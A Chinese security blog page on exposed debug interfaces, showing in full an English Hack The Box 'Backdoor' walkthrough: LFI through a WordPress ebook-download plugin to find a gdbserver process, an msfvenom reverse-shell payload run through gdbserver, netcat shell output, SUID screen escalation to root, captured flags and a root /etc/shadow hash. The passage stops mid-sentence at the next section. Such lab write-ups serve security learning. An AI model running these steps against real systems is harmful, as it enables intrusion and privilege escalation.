---
title: 调试协议与服务暴露
url: https://lucifer11.xyz/knowledge/debug/
source: 0xfd's blog
date: 2026-11-25
fetch_date: 2026-11-26T10:13:50.735760
---

# 调试协议与服务暴露

![0xfd's blog](/images/fifteen-katana-zero-katana-zero.gif)
[0xfd's blog](/)

by 0xfd

* [首页](/)
* [知识库](/knowledge/)
* [导读](/guide/)
* [分类](/categories/)
* [标签](/tags/)
* [归档](/archives/)
* [关于](/about/)
* 搜索

* 文章目录
* 站点概览

1. [分析重点](#%E5%88%86%E6%9E%90%E9%87%8D%E7%82%B9)
2. [案例与技术索引](#%E6%A1%88%E4%BE%8B%E4%B8%8E%E6%8A%80%E6%9C%AF%E7%B4%A2%E5%BC%95)
3. [进程文件读取与 gdbserver](#%E8%BF%9B%E7%A8%8B%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E-gdbserver)
4. [三个语言运行时的调试协议](#%E4%B8%89%E4%B8%AA%E8%AF%AD%E8%A8%80%E8%BF%90%E8%A1%8C%E6%97%B6%E7%9A%84%E8%B0%83%E8%AF%95%E5%8D%8F%E8%AE%AE)
5. [损坏备份、OTP 与 Xdebug](#%E6%8D%9F%E5%9D%8F%E5%A4%87%E4%BB%BD%E3%80%81OTP-%E4%B8%8E-Xdebug)

![253](/images/fifteen-katana-zero-katana-zero.gif)

253

漏洞分析、利用机制、二进制研究与安全工程

[83
日志](/archives/)

[65
分类](/categories/)

[312
标签](/tags/)

GitHub

E-Mail

Twitter

FB Page

YouTube

Instagram

infosec.exchange

![Creative Commons](https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg)

0%

链接

* atsud0
* 记忆里的纯真
* 小离

# 调试协议与服务暴露

发表于
2026-11-25

分类于

[Web安全](/categories/Web%E5%AE%89%E5%85%A8/)
，
[调试接口](/categories/Web%E5%AE%89%E5%85%A8/%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3/)

阅读次数：

本文字数：
9.6k

阅读时长 ≈
35 分钟

调试功能本来就具备读取状态或执行表达式的能力，风险取决于谁能到达这些接口。本章并列 gdbserver、Xdebug、rpdb、JDWP 和 PHP-FPM 的原实验，保留协议格式、端口和触发时机。

调试功能本来就具备读取状态或执行表达式的能力，风险取决于谁能到达这些接口。本章并列 gdbserver、Xdebug、rpdb、JDWP 和 PHP-FPM 的原实验，保留协议格式、端口和触发时机。

[知识库目录](/knowledge/)
[研究导读](/guide/)
[下载 Markdown](/knowledge/debug/source.md)
展开全部技术记录

## 分析重点

Backdoor 先用文件读取定位进程，再连接 gdbserver。

Mimic-SSRF 的三种语言分别使用自己的调试协议，断点和回连方向都随记录呈现。

Static 的备份修复、OTP、Xdebug 与 ersatool 分支保留完整上下文。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [进程文件读取与 gdbserver](#case-backdoor) | backdoor | LFI、gdbserver、SUID |
| [三个语言运行时的调试协议](#case-mimic-ssrf) | mimic-ssrf | SSRF、Xdebug、rpdb、JDWP |
| [损坏备份、OTP 与 Xdebug](#case-static) | static | Xdebug、PHP-FPM、2FA、PATH |

## 进程文件读取与 gdbserver

ebook-download 文件读取用于定位 1337 端口对应进程，gdbserver 提供执行入口，screen 的 SUID 会话成为后续提权点。

来源 backdoor · 原记录 2021-11-22 · 9 个代码块 · 4 处图片引用

查看分析过程、攻击步骤与完整代码

#### introduce

OS: Linux
Difficulty: Easy
Points: 20
Release: 20 Nov 2021
IP: 10.10.11.125

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2102.jpg)
* ![my htb rank](http://www.hackthebox.eu/badge/image/235857)

#### Enumeration

#### NMAP

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` ┌──(root💀kali)-[~/hackthebox/machine/backdoor] └─# nmap -sV -v -p- --min-rate=10000 10.10.11.125 PORT     STATE SERVICE VERSION 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu)) ``` |

#### User

==================

1. Find the PID for port 1337 (use burp intruder or wfuzz)

|  |  |
| --- | --- |
| ``` 1 ``` | ``` wfuzz -u 'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000 ``` |

2. You will see something like this, confirming gdbserver is running on port 1337

|  |  |
| --- | --- |
| ``` 1 ``` | ``` while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;" ``` |

3. create a payload

|  |  |
| --- | --- |
| ``` 1 ``` | ``` msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.17 LPORT=4444 -f elf -o rev.elf ``` |

4. Run gdb on localhost and then run the following commands

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` target extended-remote 10.10.11.125:1337 remote put luci.elf luci.elf set remote exec-file /home/user/luci.elf show remote exec-file b main run ``` |

wait a second till stacked at main function, this should give shell as “user”

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ``` | ``` ┌──(root💀kali)-[~/hackthebox/machine/backdoor] └─# nc -lvp 4444                                                                                                         Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.125. Ncat: Connection from 10.10.11.125:37606. id whoami uid=1000(user) gid=1000(user) groups=1000(user) user python -c 'import pty; pty.spawn("/bin/bash")' /bin/sh: 3: python: not found whoami user python3 -c 'import pty; pty.spawn("/bin/bash")' user@Backdoor:/home/user$ cat user.txt cat user.txt ea3dca075716f407ce28c6c596c7868c ``` |

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2103.jpg)

#### Root

================

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ``` | ``` user@Backdoor:/home/user$ find / -perm -4000 -ls 2>/dev/null find / -perm -4000 -ls 2>/dev/null     53822     52 -rwsr-xr--   1 root     messagebus    51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper     53829     16 -rwsr-xr-x   1 root     root          14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device     69114     24 -rwsr-xr-x   1 root     root          22840 May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1       709    464 -rwsr-xr-x   1 root     root         473576 Jul 23 12:55 /usr/lib/openssh/ssh-keysign     41373     68 -rwsr-xr-x   1 root     root          68208 Jul 14 22:08 /usr/bin/passwd     41369     84 -rwsr-xr-x   1 root     root          85064 Jul 14 22:08 /usr/bin/chfn     41372     88 -rwsr-xr-x   1 root     root          88464 Jul 14 22:08 /usr/bin/gpasswd     52943     56 -rwsr-sr-x   1 daemon   daemon        55560 Nov 12  2018 /usr/bin/at     53546     68 -rwsr-xr-x   1 root     root          67816 Jul 21  2020 /usr/bin/su     53547    164 -rwsr-xr-x   1 root     root         166056 Jan 19  2021 /usr/bin/sudo     43506     44 -rwsr-xr-x   1 root     root          44784 Jul 14 22:08 /usr/bin/newgrp     53122     40 -rwsr-xr-x   1 root     root          39144 Mar  7  2020 /usr/bin/fusermount     55289    464 -rwsr-xr-x   1 root     root         474280 Feb 23  2021 /usr/bin/screen     53616     40 -rwsr-xr-x   1 root     root          39144 Jul 21  2020 /usr/bin/umount     53274     56 -rwsr-xr-x   1 root     root          55528 Jul 21  2020 /usr/bin/mount     41370     52 -rwsr-xr-x   1 root     root          53040 Jul 14 22:08 /usr/bin/chsh     69112     32 -rwsr-xr-x   1 root     root          31032 May 26  2021 /usr/bin/pkexec user@Backdoor:/home/user$ ps -ef | grep -i screen ps -ef | grep -i screen root         844     827  0 14:10 ?        00:00:00 /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done root         957       1  0 14:10 ?        00:00:00 SCREEN -dmS root user        1976    1674  0 14:16 pts/1    00:00:00 grep --color=auto -i screen ``` |

SUID set on screen and there is session name root

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` export TERM=xterm screen -x root/root ``` |

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ``` | ``` root@Backdoor:~# id id uid=0(root) gid=0(root) groups=0(root) root@Backdoor:~# whoami whoami root root@Backdoor:~# cd /root cd /root root@Backdoor:~# cat root.txt cat root.txt 70748562960ea59ea79495cc490c2276 root@Backdoor:~# cat /etc/shadow | grep root cat /etc/shadow | grep root root:$6$2A4weemb9e7Lxqpq$BgE2d0pkAMj0dVN/rtjtxcI3MXZmK1DMrB/m7VG.UNsvxSCnK8uzig3Ys9xYOKMRLehEwmR7oNa96fn5vG0Lc/:18832:0:99999:7::: ``` |

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2104.jpg)

#### Summary of knowledge

* fuzz the PID for port 1337 through wp ebook-download plugin file download
* get reverse shell through remote debuging gdb server
* use screen SUID file to privesclation

#### Contact me

* QQ: 1185151867
* twitter: https://twitter.com/fdlucifer11
* github: https://github.com/FDlucifer

I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…

## 三个语言运行时的调试协议

同一题目分别分析 PHP Xdebug、Python rpdb 和 Java JDWP。gopher、proc 文件、断点与转发路径是三套既有实验的对...